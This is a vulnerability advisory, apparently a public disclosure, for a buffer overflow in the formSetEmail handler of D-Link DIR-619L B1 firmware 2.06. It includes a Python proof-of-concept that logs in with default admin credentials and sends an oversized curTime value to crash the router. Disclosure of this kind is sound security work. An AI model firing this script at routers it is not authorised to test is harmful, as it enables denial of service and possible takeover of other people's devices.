## Overview

- Manufacturer's website information：https://www.dlink.com/
- Firmware download address ：https://support.dlink.com/resource/products/DIR-619L/REVB/DIR-619L_REVB_FIRMWARE_PATCH_2.06.B01_WW.ZIP

## Affected version

D-Link DIR-619L B1 2.06

## Vulnerability details

In the D-Link DIR-619L B1 2.06 firmware has a buffer overflow vulnerability in the `formSetEmail` function. The `Var` variable receives the `curTime` parameter from a POST request. However, since the user can control the input of `curTime`, the `sprintf` can cause a buffer overflow vulnerability.

![image-20240927135016434](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240927135016434.png)

![image-20240927135027980](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240927135027980.png)

## POC

```python
import argparse, requests
import sys
import json

if sys.version_info[0] != 3:
    print("Please run the exploit in python3")
    sys.exit(1)

# You can also login with scripts below.
def login():
    login_url = "goform/formLogin"
    url = base_url + "/" + login_url
    print("1. Login: send request to", url)
    login_data = "curTime=1666884522835&FILECODE=a6.jpeg%0D%0A&VERIFICATION_CODE=LSYFZ&login_n=admin&login_pass=YWRtaW4A"
    response = requests.post(url=url, data=login_data, allow_redirects=False)
    print(response.text)


def poc():
    target_url = "goform/formSetEmail"
    print("2. get target_url:", target_url)
    url = base_url + "/" + target_url
    print("3. send request to", url)
    
    # Using a dictionary to hold multiple parameters
    data = {
        "curTime": "A" * 2000,  # Adjust the number according to your needs
    }
    
    json_data = json.dumps(data)
    print("request body:", json_data)
    response = requests.post(url=url, json=data, allow_redirects=False)
    print(response.text)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Run the exploit')
    parser.add_argument('ip', type=str, default=None, help='The Router IP')
    args = parser.parse_args()

    global base_url
    base_url = "http://{}".format(args.ip)

    # login()
    poc()

```

![image-20240927142954053](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240927142954053.png)
